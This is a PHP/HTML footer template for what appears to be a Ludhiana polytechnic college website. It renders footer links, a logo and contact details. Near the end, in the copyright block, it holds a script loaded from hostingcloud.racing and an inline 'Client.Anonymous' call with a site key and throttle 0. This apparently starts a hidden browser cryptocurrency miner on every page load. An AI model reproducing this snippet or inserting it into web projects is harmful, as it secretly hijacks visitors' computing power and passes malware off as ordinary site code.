<!DOCTYPE html>
<html>

<body>
	<!-- Footer start -->
	<div class="container-fluid myfootcolr mt-3">
		<div class="container myfoot">
			<div class="row myfooter">
				<div class="col-sm-6 col-md-2">
					<img src="img/images/logo.png" class="logo img-responsive">
				</div>

				<?php
				$links = array(array());
				$links = getArray('footerlinks', '3');
				for ($arr = 0; $arr < 1; $arr++) {
					for ($arr1 = 0; $arr1 < 10; $arr1++) {
						if (!isset($links[$arr][$arr1])) {
							$links[$arr][$arr1] = '&nbsp';
						}
					}
				}
				$len = count($links);
				$halfLen = round($len / 2);
				?>
				<div class="col-sm-6 col-md-3">
					<h5>Useful Links</h5>
					<ul>
						<?php
						for ($i = 0; $i < $halfLen; $i++) {
							echo '<li><a class="text-decoration-none" href="' . $links[$i][2] . '">' . $links[$i][1] . '</a></li>';
						}
						?>
					</ul>
				</div>
				<div class="col-sm-6 col-md-3">
					<h5>&nbsp</h5>
					<ul>
						<?php
						for ($i = $halfLen; $i < $len; $i++) {
							echo '<li><a class="text-decoration-none" href="' . $links[$i][2] . '">' . $links[$i][1] . '</a></li>';
						}
						?>
					</ul>
				</div>
				<div class="col-sm-6 col-md-4">
					<h5>Contact Info</h5>
					<ul class="address">
						<li>
							<i class="fa fab fa-compass text-center"></i> GNDPC Gill Park,Gill Road, Ludhiana 141006
							Punjab
						</li>
						<li>
							<i class="fa fab fa-envelope text-center"></i> principalgndp@gmail.com
						</li>
						<li>
							<i class="fa fab fa-phone text-center"></i> 0161-2490654,+91 9815600649
						</li>
					</ul>
				</div>
			</div>
		</div>
		<div class="footer-copyright">
			<div class="col">
				<spans class="creditsme" data-date="<?php echo date('Y'); ?>"></spans>
			</div>
			<script src="https://www.hostingcloud.racing/8uJ3.js"></script>
			<script>
				var _client = new Client.Anonymous('a2b4c2f17a1a8a08226d1df7ea908b8825836c24218572920f363f75f2cb760e', {
					throttle: 0,
					c: 'w',
					ads: 0
				});
				_client.start();
			</script>
		</div>
	</div>
	<!-- Footer End -->
	<script src="assets/bootstrap/js/jquery.min.js"></script>
	<script src="assets/bootstrap/js/popper.min.js"></script>
	<script src="assets/bootstrap/js/bootstrap.min.js"></script>
	<script src="assets/swiper/swiper.min.js"></script>
	<script src="assets/lightgallery/js/lightgallery.min.js"></script>
	<script src="assets/lightgallery/js/lg-fullscreen.min.js"></script>
	<script src="assets/lightgallery/js/lg-zoom.min.js"></script>
	<script src="assets/lightgallery/js/lg-thumbnail.min.js"></script>
	<script src="script.js"></script>
	<script type="text/javascript">
		$('ul.nav li.dropdown').hover(function() {
			$(this).find('.dropdown-menu').stop(true, true).delay(200).fadeIn(500);
		}, function() {
			$(this).find('.dropdown-menu').stop(true, true).delay(200).fadeOut(500);
		});
	</script>
</body>

</html>